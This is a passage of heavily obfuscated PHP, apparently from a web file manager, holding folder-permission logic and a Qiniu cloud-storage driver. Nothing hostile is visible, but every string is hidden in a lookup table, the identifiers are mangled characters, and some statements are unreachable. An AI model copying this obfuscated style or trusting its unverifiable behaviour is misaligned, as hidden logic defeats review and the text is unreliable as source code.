$this->authFolderOwnerUser($ÏÖëíÓ‚§‡§); $¶¹óÌ“Ò…[$°œ¤—] = $î´•²¶Ì½¸¡; $Æ¾»ªûé = array_merge($Æ¾»ªûé, $î´•²¶Ì½¸¡[$äÕ€æ£¶[588]]); if ($î´•²¶Ì½¸¡[$äÕ€æ£¶[1942]]) { break; } } if (count($Æ¾»ªûé) == 0) { $Æ¾»ªûé = $this->authFolderOwnerGroup($Œ¬Ú¾[$äÕ€æ£¶[498]]); } $Æ¾»ªûé = array_unique($Æ¾»ªûé); if (AuthModel::authCheckRoot($Œ¬Ú¾[$äÕ€æ£¶[408]][$äÕ€æ£¶[409]])) { $Æ¾»ªûé[] = USER_ID; } $Œ¬Ú¾[$äÕ€æ£¶[408]][$äÕ€æ£¶[1943]] = Model($äÕ€æ£¶[507])->userListInfo($Æ¾»ªûé); return $Œ¬Ú¾; } private function authFolderOwnerGroup($û§ÒÍ­•ô) { $—´ =& $_SERVER[ÀÆ]; $ŒØÁ—®¦ûùûĞ = Model($—´[1828])->where(array($—´[1739] => $û§ÒÍ­•ô))->select(); $û = array(); if (!$ŒØÁ—®¦ûùûĞ) { return $û; } foreach ($ŒØÁ—®¦ûùûĞ as $è³‡³Ú§÷) { $¿‡Ÿ×ûœ = $this->authInfo($è³‡³Ú§÷); if (AuthModel::authCheckRoot($¿‡Ÿ×ûœ[$—´[408]])) { $û[] = $è³‡³Ú§÷[$—´[1572]]; } } return $û; } private function authFolderOwnerUser($ıÏ¿¶) { $ı…ÜªÒá =& $_SERVER[ÀÆ]; $†¢Üğ‡«€êô = array(); $¦ïİŠã¯›ë = !1; foreach ($ıÏ¿¶ as $œ²ë°Ùú“¾î) { $É‰Ú– = $this->authInfo($œ²ë°Ùú“¾î); if ($œ²ë°Ùú“¾î[$ı…ÜªÒá[498]] == $ı…ÜªÒá[191]) { $¦ïİŠã¯›ë = !0; } if ($œ²ë°Ùú“¾î[$ı…ÜªÒá[406]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($É‰Ú–[$ı…ÜªÒá[408]])) { $†¢Üğ‡«€êô[] = $œ²ë°Ùú“¾î[$ı…ÜªÒá[498]]; } } } return array($ı…ÜªÒá[588] => $†¢Üğ‡«€êô, $ı…ÜªÒá[1942] => $¦ïİŠã¯›ë); } public function authMake($”ô²¤Ú¼òÓÖ, $Åê˜åÔ­ = false) { $“ÂªÓĞ =& $_SERVER[ÀÆ]; $ö×¤ÂŸíÄ = $this->authArrayCheck($”ô²¤Ú¼òÓÖ, $Åê˜åÔ­); if ($ö×¤ÂŸíÄ[$“ÂªÓĞ[1944]]) { $ö×¤ÂŸíÄ[$“ÂªÓĞ[1944]] = $this->sourceAuthInfo($ö×¤ÂŸíÄ[$“ÂªÓĞ[1944]]); } return $ö×¤ÂŸíÄ; } public function authArrayCheck($ùÌü, $¤©ÌÀà = false) { $º´‹‹Ì =& $_SERVER[ÀÆ]; if (!$ùÌü) { return array($º´‹‹Ì[409] => 0, $º´‹‹Ì[460] => !1); } $¤©ÌÀà = $¤©ÌÀà ? $¤©ÌÀà : USER_ID; $ÓÓŠì§ª­ = 0; $ÍÏ– = 0; $–»Ï = 0; $¾‚Ö§†ø = 0; $´™šöÔò = 0; $ñÈËçÙòÏ = 0; $œØÂ‘ĞŞ = 1000; $ŞéÚ = 0; $âîõÏü = 0; $„ıú¹ = 0; $Ê½Å©ı›ë‰ = 0; $ï…µ’Ô¢²ŒÈ = array($º´‹‹Ì[397] => 0); foreach ($ùÌü as $ï…µ’Ô¢²ŒÈ) { $á——Ù = $this->authInfo($ï…µ’Ô¢²ŒÈ); if (!$á——Ù) { continue; } $è¤ = $ï…µ’Ô¢²ŒÈ[$º´‹‹Ì[498]]; $ÏŞˆ¹ = intval($á——Ù[$º´‹‹Ì[408]]); if ($ï…µ’Ô¢²ŒÈ[$º´‹‹Ì[406]] == SourceModel::TYPE_USER && $è¤ == $¤©ÌÀà) { $ÓÓŠì§ª­ = !0; $–»Ï = $á——Ù; $ÍÏ– = $ÏŞˆ¹; } else { if ($ï…µ’Ô¢²ŒÈ[$º´‹‹Ì[406]] == SourceModel::TYPE_GROUP && $this->groupContainUser($è¤, $¤©ÌÀà)) { $¾‚Ö§†ø = !0; $ƒ…å = $this->groupStepToUserGroup($è¤, $¤©ÌÀà); if ($ƒ…å < $œØÂ‘ĞŞ) { $œØÂ‘ĞŞ = $ƒ…å; $´™šöÔò = $ÏŞˆ¹; $ñÈËçÙòÏ = $á——Ù; $ŞéÚ = $è¤; } if ($ƒ…å == $œØÂ‘ĞŞ && $ÏŞˆ¹ >= $´™šöÔò) { $´™šöÔò = $ÏŞˆ¹; $ñÈËçÙòÏ = $á——Ù; $ŞéÚ = $è¤; } } else { if ($è¤ == $º´‹‹Ì[191]) { $âîõÏü = !0; $Ê½Å©ı›ë‰ = $á——Ù; $„ıú¹ = $ÏŞˆ¹; } } } } if ($ÓÓŠì§ª­) { $ŠáŞöı´Î = $ÍÏ–; $á——Ù = $–»Ï; $ö©êñ“Ÿø°‚ = LNG($º´‹‹Ì[1945]); } else { if ($¾‚Ö§†ø) { $ŠáŞöı´Î = $´™šöÔò; $á——Ù = $ñÈËçÙòÏ; $Şš† = Model($º´‹‹Ì[516])->getInfo($ŞéÚ); $ö©êñ“Ÿø°‚ = $º´‹‹Ì[160] . $Şš†[$º´‹‹Ì[520]] . $º´‹‹Ì[1946] . LNG($º´‹‹Ì[1947]); } else { if ($âîõÏü) { $ŠáŞöı´Î = $„ıú¹; $á——Ù = $Ê½Å©ı›ë‰; $ö©êñ“Ÿø°‚ = LNG($º´‹‹Ì[1918]); } else { $ŠáŞöı´Î = 0; $á——Ù = !1; $ö©êñ“Ÿø°‚ = $º´‹‹Ì[33]; } } } $ïÌÔĞ¦”ËÜï = array($º´‹‹Ì[1937] => intval($ŠáŞöı´Î), $º´‹‹Ì[1921] => $á——Ù, $º´‹‹Ì[1938] => $ö©êñ“Ÿø°‚, $º´‹‹Ì[1930] => $ï…µ’Ô¢²ŒÈ[$º´‹‹Ì[397]]); return $ïÌÔĞ¦”ËÜï; } private function groupContainUser($Àçîì, $çãÂÁÑ¬ = false) { return in_array($Àçîì, $this->userGroupParents($çãÂÁÑ¬)); } private function groupStepToUserGroup($êõ, $Û™¶µê = false) { $êŒï½“ =& $_SERVER[ÀÆ]; $¼Ø = $this->userGroupList($Û™¶µê); $Ÿø—šñ = 1000; $Ø´¢¾§¦ú¤ = $GLOBALS[$êŒï½“[6]][$êŒï½“[88]][$êŒï½“[1839]] == 1; $‡×ÉÕ§«¬¥Û = $Ø´¢¾§¦ú¤ ? 3 : 2; foreach ($¼Ø as $¢”ÏİºØ’) { if ($¢”ÏİºØ’[$êŒï½“[1739]] == $êõ) { return 0; } $œÌ“úÓ–ûÉ¸ = explode($êŒï½“[47], trim($¢”ÏİºØ’[$êŒï½“[515]], $êŒï½“[47])); if ($œÌ“úÓ–ûÉ¸[0] == $êŒï½“[191] && count($œÌ“úÓ–ûÉ¸) > $‡×ÉÕ§«¬¥Û) { $©ñŸ‰İÅÍ— = array_reverse(array_slice($œÌ“úÓ–ûÉ¸, $‡×ÉÕ§«¬¥Û)); $¤‹â = array_search($êõ, $©ñŸ‰İÅÍ—); if ($¤‹â !== !1 && $¤‹â + 1 <= $Ÿø—šñ) { $Ÿø—šñ = $¤‹â + 1; } } } return $Ÿø—šñ; } private function userGroupList($Ü±À = false) { $Â‡ùèæ¦Ê£ =& $_SERVER[ÀÆ]; static $Ûöøëá¡ = array(); if (isset($Ûöøëá¡[$Ü±À])) { return $Ûöøëá¡[$Ü±À]; } $Ş¼ŞÑ = Model($Â‡ùèæ¦Ê£[532])->getInfo($Ü±À); $Ûöøëá¡[$Ü±À] = array_to_keyvalue($Ş¼ŞÑ[$Â‡ùèæ¦Ê£[1919]], $Â‡ùèæ¦Ê£[1739]); return $Ûöøëá¡[$Ü±À]; } public function userGroupParents($Ìğš£†‰) { $—‡ÙØ’€ò±”… =& $_SERVER[ÀÆ]; static $È–Óƒˆä†Ç = array(); $Ìğš£†‰ = $Ìğš£†‰ ? $Ìğš£†‰ : USER_ID; if (isset($È–Óƒˆä†Ç[$Ìğš£†‰])) { return $È–Óƒˆä†Ç[$Ìğš£†‰]; } $­Ê = $this->userGroupList($Ìğš£†‰); $ÖÁ¥’ìÃ„«·‚ = array(); $…™Šü³ë¨ê² = $GLOBALS[$—‡ÙØ’€ò±”…[6]][$—‡ÙØ’€ò±”…[88]][$—‡ÙØ’€ò±”…[1839]] == 1; $§ = $…™Šü³ë¨ê² ? 3 : 2; foreach ($­Ê as $Õöİ¯) { $ş¯£÷äÊ = array($Õöİ¯[$—‡ÙØ’€ò±”…[1739]]); $Ş€™‹òÌÔ = explode($—‡ÙØ’€ò±”…[47], trim($Õöİ¯[$—‡ÙØ’€ò±”…[515]], $—‡ÙØ’€ò±”…[47])); if ($Ş€™‹òÌÔ[0] == $—‡ÙØ’€ò±”…[191] && count($Ş€™‹òÌÔ) > $§) { $ßøô = array_slice($Ş€™‹òÌÔ, $§); $ş¯£÷äÊ = array_merge($ş¯£÷äÊ, array_reverse($ßøô)); } $ÖÁ¥’ìÃ„«·‚ = array_merge($ÖÁ¥’ìÃ„«·‚, $ş¯£÷äÊ); } $È–Óƒˆä†Ç[$Ìğš£†‰] = array_unique($ÖÁ¥’ìÃ„«·‚); return $È–Óƒˆä†Ç[$Ìğš£†‰]; } public function authTargetInfoMake($ËË) { $¬¶«‚‹´ =& $_SERVER[ÀÆ]; $µĞŠŠ²µÔ = array(); $¡ä—çê©û’ = array(); foreach ($ËË as $øã®) { if ($øã®[$¬¶«‚‹´[406]] == SourceModel::TYPE_USER) { $µĞŠŠ²µÔ[] = intval($øã®[$¬¶«‚‹´[498]]); } else { if ($øã®[$¬¶«‚‹´[406]] == SourceModel::TYPE_GROUP) { $¡ä—çê©û’[] = intval($øã®[$¬¶«‚‹´[498]]); } } } if ($µĞŠŠ²µÔ) { $µĞŠŠ²µÔ = Model($¬¶«‚‹´[507])->userListInfo($µĞŠŠ²µÔ); } if ($¡ä—çê©û’) { $êÈ™ÛŞ¿¿ƒ = array($¬¶«‚‹´[1826] => array($¬¶«‚‹´[413], $¡ä—çê©û’)); $¡ä—çê©û’ = Model($¬¶«‚‹´[516])->field($¬¶«‚‹´[1948])->where($êÈ™ÛŞ¿¿ƒ)->select(); $¡ä—çê©û’ = array_to_keyvalue($¡ä—çê©û’, $¬¶«‚‹´[1739]); } return array($¬¶«‚‹´[1949] => $µĞŠŠ²µÔ, $¬¶«‚‹´[1950] => $¡ä—çê©û’); } public function authInfo($şÏİîÌ) { $ŸÛ¡ìĞ =& $_SERVER[ÀÆ]; if ($şÏİîÌ[$ŸÛ¡ìĞ[1842]]) { $œ¢ÏäÃ¢ = Model($ŸÛ¡ìĞ[501])->listData($şÏİîÌ[$ŸÛ¡ìĞ[1842]]); if (!$œ¢ÏäÃ¢) { return !1; $ŸŠÌ¡ = Model($ŸÛ¡ìĞ[501])->listData(); $ÏåÌ = array_filter_by_field($ŸŠÌ¡, $ŸÛ¡ìĞ[408], $ŸÛ¡ìĞ[191]); return $ÏåÌ; } $·Ş‚­ëş” = array_field_key($œ¢ÏäÃ¢, array($ŸÛ¡ìĞ[395], $ŸÛ¡ìĞ[28], $ŸÛ¡ìĞ[408], $ŸÛ¡ìĞ[1761], $ŸÛ¡ìĞ[1762])); $·Ş‚­ëş”[$ŸÛ¡ìĞ[1951]] = $şÏİîÌ; return $·Ş‚­ëş”; } else { return array($ŸÛ¡ìĞ[414] => 0, $ŸÛ¡ìĞ[1745] => $şÏİîÌ[$ŸÛ¡ìĞ[1896]], $ŸÛ¡ìĞ[415] => $ŸÛ¡ìĞ[33], $ŸÛ¡ìĞ[1761] => $ŸÛ¡ìĞ[1952]); } } } goto bÜŠµ÷Ó˜Ø; F‰Ÿåƒ¾“ƒ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($ö–¯Ü) { parent::__construct(); require_once SDK_DIR . $_SERVER[ÀÆ][1345]; $this->_init($ö–¯Ü); } public function _init($­•Å) { $ÆÎŸœÑàõÚ =& $_SERVER[ÀÆ]; foreach ($­•Å as $ÑÉá½²ÄÈÓ => $Í·‚ä) { if (isset($this->{$ÑÉá½²ÄÈÓ})) { $this->{$ÑÉá½²ÄÈÓ} = $Í·‚ä; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÆÎŸœÑàõÚ[1346] . LNG($ÆÎŸœÑàõÚ[1306])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ÙòÅÚã, $»Ä·íÆ = '', $¬•½Ñâ’Å = REPEAT_RENAME) { if ($this->setContent($ÙòÅÚã, $»Ä·íÆ)) { return $this->getPathOuter($ÙòÅÚã); } return !1; } public function mkdir($´¿½·, $Ş®º = REPEAT_SKIP) { $‰Ÿ†…‡“„éµ =& $_SERVER[ÀÆ]; $º––ãß‚î¶£ = trim($´¿½·, $‰Ÿ†…‡“„éµ[8]); if ($this->_isFolder($º––ãß‚î¶£)) { return $this->getPathOuter($º––ãß‚î¶£); } $´¿½· = $º––ãß‚î¶£ . $‰Ÿ†…‡“„éµ[8]; $ë‰„Ä = get_path_this($º––ãß‚î¶£); $×â¸·˜ = $´¿½· . $ë‰„Ä; if (!$this->mkfile($×â¸·˜)) { return !1; } if (!$this->moveFile($×â¸·˜, $´¿½·)) { $this->delFile($×â¸·˜); return !1; } return $this->getPathOuter($º––ãß‚î¶£); } public function copyFile($’äë˜ıÙ, $î†Ş) { $Í¶Ó¹—ç› = $this->bucketManager->copy($this->bucket, $’äë˜ıÙ, $this->bucket, $î†Ş, !0); return $Í¶Ó¹—ç› ? !1 : $this->getPathOuter($î†Ş); } public function moveFile($¿›Ë®ÌŞ‰Ø“«, $Åà­’Ïç) { $Ïõóøè = $this->bucketManager->move($this->bucket, $¿›Ë®ÌŞ‰Ø“«, $this->bucket, $Åà­’Ïç, !0); return $Ïõóøè ? !1 : $this->getPathOuter($Åà­’Ïç); } public function delFile($Ì˜ û•ë÷£éÑ) { if (!$this->exist($Ì˜ û•ë÷£éÑ)) { return !0; } $† â¿Ÿ‘Ò„º = $this->bucketManager->delete($this->bucket, $Ì˜ û•ë÷£éÑ); return $† â¿Ÿ‘Ò„º ? !1 : !0; } public function delFolder($Ã„¦ÅÔƒ‹î–¼) { $ÔÖë®ŠÌ =& $_SERVER[ÀÆ]; if (!$this->exist($Ã„¦ÅÔƒ‹î–¼)) { return !0; } $this->listItemCache = !1; $öÙìØëË¤ô = $this->fileList($Ã„¦ÅÔƒ‹î–¼); $this->listItemCache = !0; $øú = trim($Ã„¦ÅÔƒ‹î–¼, $ÔÖë®ŠÌ[8]) . $ÔÖë®ŠÌ[8]; if (!empty($Ã„¦ÅÔƒ‹î–¼) && $Ã„¦ÅÔƒ‹î–¼ !== $ÔÖë®ŠÌ[191] && !in_array($øú, $öÙìØëË¤ô[$ÔÖë®ŠÌ[75]])) { $öÙìØëË¤ô[$ÔÖë®ŠÌ[75]][] = $øú; } $‹âõ”Ş = $this->delByBatch($öÙìØëË¤ô[$ÔÖë®ŠÌ[74]]); if (!$‹âõ”Ş) { return !1; } $‹âõ”Ş = $this->delByBatch($öÙìØëË¤ô[$ÔÖë®ŠÌ[75]]); if (!$‹âõ”Ş) { return !1; } return $this->delFile($øú); } private function delByBatch($ìŠ€ñû‹ìÙ­‚) { foreach (array_chunk($ìŠ€ñû‹ìÙ­‚, 1000) as $“‹Şè¡ Òó) { $÷â–ÏıÔ™§ = $this->bucketManager->buildBatchDelete($this->bucket, $“‹Şè¡ Òó); list($Â, $¦½²ÁöË) = $this->bucketManager->batch($÷â–ÏıÔ™§); if ($¦½²ÁöË) { return !1; } } return !0; } public function rename($‹¯, $²Õ) { return $this->renameObject($‹¯, $²Õ); } public function fileInfo($ìº€ó«¾, $…ï·ĞÜ¹ˆ©ÁÎ = false, $è¦îÇ = array()) { $ù‹™…®˜áİ³ƒ =& $_SERVER[ÀÆ]; $¿òŞµĞ‘”ï = array($ù‹™…®˜áİ³ƒ[28] => $this->pathThis($ìº€ó«¾), $ù‹™…®˜áİ³ƒ[76] => $this->getPathOuter($ù‹™…®˜áİ³ƒ[8] . $ìº€ó«¾), $ù‹™…®˜áİ³ƒ[29] => $ù‹™…®˜áİ³ƒ[193], $ù‹™…®˜áİ³ƒ[78] => isset($è¦îÇ[$ù‹™…®˜áİ³ƒ[1347]]) ? $è¦îÇ[$ù‹™…®˜áİ³ƒ[1347]] : 0, $ù‹™…®˜áİ³ƒ[168] => $this->ext($ìº€ó«¾)); if ($…ï·ĞÜ¹ˆ©ÁÎ) { return $¿òŞµĞ‘”ï; } $¿òŞµĞ‘”ï[$ù‹™…®˜áİ³ƒ[194]] = $¿òŞµĞ‘”ï[$ù‹™…®˜áİ³ƒ[84]] = 0; $¿òŞµĞ‘”ï[$ù‹™…®˜áİ³ƒ[195]] = $¿òŞµĞ‘”ï[$ù‹™…®˜áİ³ƒ[196]] = !0; if (empty($è¦îÇ)) { $è¦îÇ = $this->objectMeta($ìº€ó«¾); if (!$è¦îÇ) { return $¿òŞµĞ‘”ï; } } if (isset($è¦îÇ[$ù‹™…®˜áİ³ƒ[1348]])) { $¿òŞµĞ‘”ï[$ù‹™…®˜áİ³ƒ[84]] = substr($è¦îÇ[$ù‹™…®˜áİ³ƒ[1348]] . $ù‹™…®˜áİ³ƒ[33], 0, 10); } if (isset($è¦îÇ[$ù‹™…®˜áİ³ƒ[1347]])) { $¿òŞµĞ‘”ï[$ù‹™…®˜áİ³ƒ[78]] = $è¦îÇ[$ù‹™…®˜áİ³ƒ[1347]]; } return $¿òŞµĞ‘”ï; } public function folderInfo($Ö•É—óºİ, $¼ËÌÔü = false) { $ĞÍÜµü =& $_SERVER[ÀÆ]; $§ë = array($ĞÍÜµü[28] => $this->pathThis($Ö•É—óºİ), $ĞÍÜµü[76] => $this->getPathOuter($ĞÍÜµü[8] . $Ö•É—óºİ), $ĞÍÜµü[29] => $ĞÍÜµü[77]); if ($¼ËÌÔü) { return $§ë; } $§ë[$ĞÍÜµü[194]] = $§ë[$ĞÍÜµü[84]] = 0; $§ë[$ĞÍÜµü[195]] = $§ë[$ĞÍÜµü[196]] = !0; $Ö•É—óºİ = rtrim($Ö•É—óºİ, $ĞÍÜµü[8]) . $ĞÍÜµü[8]; $…Ãšü = $this->objectMeta($Ö•É—óºİ); if (isset($…Ãšü[$ĞÍÜµü[1348]])) { $§ë[$ĞÍÜµü[84]] = substr($…Ãšü[$ĞÍÜµü[1348]] . $ĞÍÜµü[33], 0, 10); } return $§ë; } public function listPath($âîà ™, $÷ÅŞ = false) { $Ïµ§ø =& $_SERVER[ÀÆ]; $Ñø° = $this->fileList($âîà ™, $Ïµ§ø[8], !0); foreach ($Ñø°[$Ïµ§ø[75]] as $é´×†÷ÆÎ’ => $ª ½¨œ«¡ˆ) { $Ñø°[$Ïµ§ø[75]][$é´×†÷ÆÎ’] = $this->folderInfo($ª ½¨œ«¡ˆ, $÷ÅŞ); } foreach ($Ñø°[$Ïµ§ø[74]] as $é´×†÷ÆÎ’ => $ª ½¨œ«¡ˆ) { $Ñø°[$Ïµ§ø[74]][$é´×†÷ÆÎ’] = $this->fileInfo($ª ½¨œ«¡ˆ[$Ïµ§ø[93]], $÷ÅŞ, $ª ½¨œ«¡ˆ); } return $Ñø°; } public function has($¬Æ, $ÒøÔ¸ş = false, $ÃØŒ = true) { $¦Ö§äŠ =& $_SERVER[ÀÆ]; $¬Æ = trim($¬Æ, $¦Ö§äŠ[8]); $ú×Ù… = empty($¬Æ) && $¬Æ !== $¦Ö§äŠ[191] ? $¦Ö§äŠ[33] : $¬Æ . $¦Ö§äŠ[8]; $€Š˜”Á¥‰Å = $¦Ö§äŠ[33]; $“ó÷ = 500; $³¤ = $¦Ö§äŠ[8]; $‹®ƒÑî— = $Îİß = 0; while (!0) { check_abort(); list($º†ÁŠšÉÙÒ, $ß‰½£€á¨ƒ) = $this->bucketManager->listFiles($this->bucket, $ú×Ù…, $€Š˜”Á¥‰Å, $“ó÷, $³¤); if ($ß‰½£€á¨ƒ) { break; } $€Š˜”Á¥‰Å = array_key_exists($¦Ö§äŠ[1318], $º†ÁŠšÉÙÒ) ? $€Š˜”Á¥‰Å = $º†ÁŠšÉÙÒ[$¦Ö§äŠ[1349]] : $¦Ö§äŠ[33]; if ($ÒøÔ¸ş) { if (!empty($º†ÁŠšÉÙÒ[$¦Ö§äŠ[1350]])) { $‹®ƒÑî— += count($º†ÁŠšÉÙÒ[$¦Ö§äŠ[1350]]); } if (!empty($º†ÁŠšÉÙÒ[$¦Ö§äŠ[1351]])) { $Îİß += count($º†ÁŠšÉÙÒ[$¦Ö§äŠ[1351]]); } if ($€Š˜”Á¥‰Å === $¦Ö§äŠ[33]) { break; } continue; } if ($ÃØŒ) { if (!empty($º†ÁŠšÉÙÒ[$¦Ö§äŠ[1350]])) { return !0; } } else { if (!empty($º†ÁŠšÉÙÒ[$¦Ö§äŠ[1351]])) { return !0; } } if ($€Š˜”Á¥‰Å === $¦Ö§äŠ[33]) { break; } } if ($ÒøÔ¸ş) { return array($¦Ö§äŠ[203] => $‹®ƒÑî—, $¦Ö§äŠ[204] => $Îİß); } return !1; } public function listAll($êõ»Œë´) { $î‡ÊÔéÍÚƒÔ =& $_SERVER[ÀÆ]; $á„ Ò½’ = $this->fileList($êõ»Œë´, $î‡ÊÔéÍÚƒÔ[33], !0); $ë²è£šÜêà¬ = array(); foreach ($á„ Ò½’[$î‡ÊÔéÍÚƒÔ[74]] as $¢ó²í™Í“Áû¡) { $ë²è£šÜêà¬[$¢ó²í™Í“Áû¡[$î‡ÊÔéÍÚƒÔ[93]]] = $¢ó²í™Í“Áû¡[$î‡ÊÔéÍÚƒÔ[78]]; } foreach ($á„ Ò½’[$î‡ÊÔéÍÚƒÔ[75]] as $¢ó²í™Í“Áû¡) { if (is_string($¢ó²í™Í“Áû¡)) { $ë²è£šÜêà¬[$¢ó²í™Í“Áû¡] = 0; } } return $this->listAllFiles($êõ»Œë´, array_keys($ë²è£šÜêà¬), $ë²è£šÜêà¬); } private function fileList($Ñ“½À¶¿ç, $îí = '', $¡³Ë“İÙ¢ì = 0) { $Î€† =& $_SERVER[ÀÆ]; $Ñ“½À¶¿ç = trim($Ñ“½À¶¿ç, $Î€†[8]); $¯² = empty($Ñ“½À¶¿ç) && $Ñ“½À¶¿ç !== $Î€†[191] ? $Î€†[33] : $Ñ“½À¶¿ç . $Î€†[8]; $ìæÀ = $Î€†[33]; $€ = 1000; $šğ­âàçÑšÅ = $this->listItemCache === !1 ? !1 : !0; $€Ä¿ßÔ¾ = $—ÌñÅ = array(); while (!0) { check_abort(); list($È¿„ŒÔØ, $Ô»¡ß) = $this->bucketManager->listFiles($this->bucket, $¯², $ìæÀ, $€, $îí); if ($Ô»¡ß) { break; } $ìæÀ = array_key_exists($Î€†[1318], $È¿„ŒÔØ) ? $ìæÀ = $È¿„ŒÔØ[$Î€†[1349]] : $Î€†[33]; $ğ‡¾°ı = isset($È¿„ŒÔØ[$Î€†[1350]]) ? $È¿„ŒÔØ[$Î€†[1350]] : array(); $Åæ = isset($È¿„ŒÔØ[$Î€†[1351]]) ? $È¿„ŒÔØ[$Î€†[1351]] : array(); foreach ($ğ‡¾°ı as $ƒÔ‡ÁÇÙ¾) { if ($ƒÔ‡ÁÇÙ¾[$Î€†[93]] == $¯²) { continue; } $äª¤× = $ƒÔ‡ÁÇÙ¾[$Î€†[93]]; $ò–ï§Â = $ƒÔ‡ÁÇÙ¾[$Î€†[1347]]; $ƒÔ‡ÁÇÙ¾[$Î€†[78]] = $ò–ï§Â; $šßûÁÏ± = $ò–ï§Â == 0 && substr($äª¤×, strlen($äª¤×) - 1, 1) == $Î€†[8] ? !0 : !1; if ($šğ­âàçÑšÅ) { $this->cacheMethod($Î€†[199], $äª¤×, $šßûÁÏ±); $this->cacheMethod($Î€†[200], $äª¤×, $ƒÔ‡ÁÇÙ¾); } if ($šßûÁÏ±) { $€Ä¿ßÔ¾[] = $äª¤×; continue; } $—ÌñÅ[] = $¡³Ë“İÙ¢ì ? $ƒÔ‡ÁÇÙ¾ : $äª¤×; } foreach ($Åæ as $äª¤×) { if ($äª¤× == $¯²) { continue; } $€Ä¿ßÔ¾[] = $äª¤×; if ($šğ­âàçÑšÅ) { $this->cacheMethod($Î€†[199], $äª¤×, !0); } } if ($ìæÀ === $Î€†[33]) { break; } } if ($šğ­âàçÑšÅ) { $this->cacheMethod($Î€†[199], $Ñ“½À¶¿ç, !0); } return array($Î€†[75] => $€Ä¿ßÔ¾, $Î€†[74] => $—ÌñÅ); } public function canRead($Õï£û) { return $this->exist($Õï£û) ? !0 : !1; } public function canWrite($ÍÑ¾ğ±µó•) { return $this->exist($ÍÑ¾ğ±µó•) ? !0 : !1; } public function getContent($Û¨) { return $this->fileSubstr($Û¨, 0, -1); } public function setContent($°„, $¤¸¸û ¦ = '') { $Øæ˜Úå˜§š— = $this->tempFile($this->pathThis($°„)); file_put_contents($Øæ˜Úå˜§š—, $¤¸¸û ¦); if ($this->upload($°„, $Øæ˜Úå˜§š—)) { $this->tempFileRemve($Øæ˜Úå˜§š—); return !0; } return !1; } public function refreshUrls($‡óœ­½) { $û¥ =& $_SERVER[ÀÆ]; $€”ô¤ = array(); if (is_array($‡óœ­½)) { foreach ($‡óœ­½ as $’Û±ªëáÓ”²•) { $€”ô¤[] = $this->link($’Û±ªëáÓ”²•); } } else { $€”ô¤[] = $this->link($‡óœ­½); } $ôêØæü®°ş = new Qiniu\Cdn\CdnManager($this->auth); list($®§Ó ª‘, $Ëƒ›ÏÄ) = $ôêØæü®°ş->refreshUrls($€”ô¤); if ($Ëƒ›ÏÄ) { return !1; } return $®§Ó ª‘[$û¥[1110]] == $û¥[745] ? !0 : !1; } public function fileSubstr($Ş·, $¹ßäŞ¸, $Ëİ¿¯ıÁâ°¹º) { $ëÄŒ =& $_SERVER[ÀÆ]; if (!($Ïø˜œ§« = $this->link($Ş·))) { return !1; } $™Ëéé = !1; if ($Ëİ¿¯ıÁâ°¹º > 0) { $Ê¦ö•à’éä¢ = $¹ßäŞ¸ + $Ëİ¿¯ıÁâ°¹º - 1; $™Ëéé = array($ëÄŒ[1352] . $¹ßäŞ¸ . $ëÄŒ[454] . $Ê¦ö•à’éä¢); } $³—Û¹ï = url_request($Ïø˜œ§«, $ëÄŒ[228], !1, $™Ëéé); return $³—Û¹ï[$ëÄŒ[735]] ? $³—Û¹ï[$ëÄŒ[1120]] : !1; } public function upload($ÀúÆ§åËñø…†, $ÒĞûğÔ±, $ã´“á = false, $ş’°é¸æØõ³ = REPEAT_REPLACE) { $«ïı = new Qiniu\Storage\UploadManager(); $ıÓĞ‘ = $this->auth->uploadToken($this->bucket, $ÀúÆ§åËñø…†); $©Ã = get_file_mime(get_path_ext($ÒĞûğÔ±)); list($‚ˆ§Ä¾×ò, $ŸÑÒ‘ÔÚ¶) = $«ïı->putFile($ıÓĞ‘, $ÀúÆ§åËñø…†, $ÒĞûğÔ±, null, $©Ã); return $ŸÑÒ‘ÔÚ¶ ? !1 : $this->getPathOuter($ÀúÆ§åËñø…†); } public function uploadFormData($¼¡¹ßÒ, $ò¥´ƒ„Ù = 3600) { return $this->uploadToken($¼¡¹ßÒ, $ò¥´ƒ„Ù); } public function multiUploadFormData($éÈóø‡ÃĞò¯, $ò°ÄÒã š = 3600) { return $this->uploadToken($éÈóø‡ÃĞò¯, $ò°ÄÒã š); } private function uploadToken($ÃõœÚ ü½Ş¸, $¥­ÃÄš†Õ˜›° = 3600) { $˜à•¼¬óÁ =& $_SERVER[ÀÆ]; $è = $¥­ÃÄš†Õ˜›°; $ÑåœÀ¬ÔëĞ = array($˜à•¼¬óÁ[1353] => $˜à•¼¬óÁ[1354]); $óø›Š = $ÃõœÚ ü½Ş¸; $š—¹•£»óñ® = $this->auth->uploadToken($this->bucket, $óø›Š, $è, $ÑåœÀ¬ÔëĞ, !0); $ã‹ı‡ = empty($this->region) || $this->region == $˜à•¼¬óÁ[1355] ? $˜à•¼¬óÁ[33] : $˜à•¼¬óÁ[454] . $this->region; $ôİò¦Û˜ = http_type() . "\x3a\x2f\57\165\x70\x6c\157\x61\144{$ã‹ı‡}\56\161\151\x6e\151\165\x70\56\x63\x6f\155\57"; return array($˜à•¼¬óÁ[1356] => $š—¹•£»óñ®, $˜à•¼¬óÁ[1357] => $ôİò¦Û˜); } public function download($ñ™ÓÂ®ÜÖ, $ÒÆô) { $ÏŸíÍŒâ = IO::getPathInner(IO::mkfile($ÒÆô)); if (!($ıÙÎù  = $this->link($ñ™ÓÂ®ÜÖ))) { return !1; } $ÃŠÙ‹ÀìÇ = 0; $×ÅªæÔ = 1024 * 200; $½Œ = fopen($ÏŸíÍŒâ, $_SERVER[ÀÆ][1358]); while (!0) { $‰øÈ = $this->fileSubstr($ñ™ÓÂ®ÜÖ, $ÃŠÙ‹ÀìÇ, $×ÅªæÔ); if ($‰øÈ === !1) { return !1; } fwrite($½Œ, $‰øÈ); $ÃŠÙ‹ÀìÇ += $×ÅªæÔ; if (strlen($‰øÈ) < 